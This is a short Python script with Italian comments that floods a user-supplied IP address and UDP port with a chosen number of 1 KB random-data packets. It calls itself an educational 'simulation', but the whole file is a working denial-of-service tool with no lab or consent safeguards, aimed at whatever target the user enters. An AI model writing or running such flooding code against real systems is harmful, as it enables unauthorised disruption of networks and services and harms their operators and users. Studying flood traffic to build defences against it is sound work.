import socket
import random

def udp_flood():
    print("--- Simulazione UDP Flood (Educational Purpose Only) ---")
    
    # 1. Input dell'IP Target
    target_ip = input("Inserisci l'IP della macchina target: ")
    
    # 2. Input della Porta Target
    target_port = int(input("Inserisci la porta UDP target (es. 80 o 443): "))
    
    # 4. Numero di Pacchetti da Inviare
    num_packets = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))

    # 3. Costruzione del Pacchetto da 1 KB (1024 byte)
    # Generiamo 1024 byte di dati casuali
    packet_data = random.randbytes(1024)
    
    # Inizializzazione del socket UDP (AF_INET = IPv4, SOCK_DGRAM = UDP)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"\nInizio invio di {num_packets} pacchetti verso {target_ip}:{target_port}...")

    sent_count = 0
    try:
        for i in range(num_packets):
            # Invio del pacchetto
            sock.sendto(packet_data, (target_ip, target_port))
            sent_count += 1
            
                
        print(f"\nCompletato! Totale pacchetti inviati: {sent_count}")
        print(f"Volume totale traffico: {sent_count} KB")

    except Exception as e:
        print(f"\nErrore durante l'invio: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    udp_flood()
